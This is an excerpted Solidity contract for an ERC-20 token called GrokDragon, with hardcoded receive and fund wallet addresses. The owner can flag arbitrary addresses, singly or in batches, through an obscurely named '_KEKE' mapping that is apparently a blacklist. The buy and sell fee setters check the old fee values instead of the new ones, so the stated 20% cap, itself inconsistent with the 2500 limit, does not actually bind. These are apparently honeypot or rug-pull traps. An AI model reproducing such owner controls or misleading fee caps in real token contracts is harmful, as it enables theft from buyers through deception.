...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _KEKE;
    ...
    constructor (
        ...
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address ReceiveAddress,
        address FundAddress
    ){
        _name = Name;
        _symbol = Symbol;
    ...
    function setBuy(uint256 newFundFee, uint256 newLpFee) public onlyOwner{
            require(_buyFundFee <= 2500, "Buy Fee cannot be more than 20%");
            require(_buyLPFee <= 2500, "Buy Fee cannot be more than 20%");
        _buyFundFee = newFundFee;
        _buyLPFee = newLpFee;
    }

    function setSell(uint256 newFundFee, uint256 newLpFee) public onlyOwner{
            require(_sellFundFee <= 2500, "Buy Fee cannot be more than 20%");
            require(_sellLPFee <= 2500, "Buy Fee cannot be more than 20%");
    ...
    function multiKEKE(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _KEKE[addresses[i]] = value;
        }
    }
    function setKEKE(address addr, bool status) public onlyOwner{
        _KEKE[addr] = status;
    }
...
contract GrokDragon is AbsToken {
    constructor() AbsToken(
        ...
        18,
        620000000000,
        address(0x0a8290C73a56E6D67927AC07b11Bd079300B251b),//ReceiveAddress
        address(0xB5e767B5B40f218F88Fe63756675D8Ea3E1920E8) //FundAddress
    ){
    }
}